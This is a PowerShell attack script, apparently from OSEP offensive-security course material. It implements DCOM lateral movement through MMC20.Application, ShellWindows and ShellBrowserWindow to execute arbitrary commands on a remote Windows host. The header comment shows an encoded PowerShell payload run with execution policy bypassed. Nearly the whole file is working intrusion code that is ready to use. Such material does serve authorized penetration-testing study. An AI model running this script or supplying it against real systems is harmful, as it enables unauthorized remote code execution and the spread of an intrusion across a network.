# OSEP - DCOM Lateral Movement (MMC20.Application + ShellWindows)
# . .\dcom_lateral.ps1
# Invoke-DCOMLateral -target 10.10.10.5 -cmd 'powershell -ep bypass -enc <B64>'

$LOG = "C:\Windows\Temp\osep_log.txt"
function wl($m,$l="INFO"){try{Add-Content $LOG "[$((Get-Date).ToString('HH:mm:ss'))][DCOM][$l] $m" -EA SilentlyContinue}catch{}}

function Invoke-DCOMLateral {
    param(
        [Parameter(Mandatory)][string]$target,
        [Parameter(Mandatory)][string]$cmd,
        [ValidateSet('MMC20','ShellWindows','ShellBrowserWindow')]
        [string]$method = 'MMC20'
    )

    wl "Target=$target Method=$method"
    Write-Host "[*] DCOM → $target via $method"

    try {
        switch ($method) {

            'MMC20' {
                # MMC20.Application — ExecuteShellCommand(cmd, dir, params, windowstate)
                $com = [Activator]::CreateInstance(
                    [type]::GetTypeFromProgID('MMC20.Application', $target)
                )
                $com.Document.ActiveView.ExecuteShellCommand(
                    'cmd.exe', $null, "/c $cmd", '7'
                )
                wl "MMC20 ExecuteShellCommand dispatched"
                Write-Host "[+] MMC20 exec dispatched"
            }

            'ShellWindows' {
                # Requires an explorer.exe window on target (common on workstations)
                $com = [Activator]::CreateInstance(
                    [type]::GetTypeFromCLSID([guid]'9BA05972-F6A8-11CF-A442-00A0C90A8F39', $target)
                )
                $item = $com.Item()
                $item.Document.Application.ShellExecute('cmd.exe', "/c $cmd", 'C:\Windows\System32', $null, 0)
                wl "ShellWindows ShellExecute dispatched"
                Write-Host "[+] ShellWindows exec dispatched"
            }

            'ShellBrowserWindow' {
                $com = [Activator]::CreateInstance(
                    [type]::GetTypeFromCLSID([guid]'C08AFD90-F2A1-11D1-8455-00A0C91F3880', $target)
                )
                $com.Document.Application.ShellExecute('cmd.exe', "/c $cmd", 'C:\Windows\System32', $null, 0)
                wl "ShellBrowserWindow ShellExecute dispatched"
                Write-Host "[+] ShellBrowserWindow exec dispatched"
            }
        }
    } catch {
        wl "Exception: $_" "ERROR"
        Write-Host "[-] Error: $_"
    }
}
